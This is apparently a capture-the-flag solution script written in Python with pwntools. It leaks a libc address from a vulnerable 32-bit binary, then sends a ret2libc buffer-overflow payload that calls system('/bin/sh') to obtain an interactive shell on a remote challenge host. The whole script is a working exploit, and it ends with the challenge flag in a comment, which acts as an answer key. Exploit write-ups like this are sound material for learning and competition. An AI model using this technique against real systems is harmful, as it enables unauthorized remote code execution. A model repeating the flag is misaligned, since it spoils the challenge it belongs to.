#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

REMOTE_NC_CMD    = "nc 9ea0fa7.678470.xyz 30443"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.recvuntil(b"libc... ")
    leak = int(r.recvline()[:-1],16)

    libc.address = leak - libc.sym.printf   

    payload = b"A"*40 + p32(0x0804900e)*2 + p32(libc.sym.system) + p32(0) + p32(libc.binsh())
    r.sendline(payload)

    r.interactive()
    #wxmctf{d0main_expansion:ret2libc.}

if __name__ == "__main__":
    main()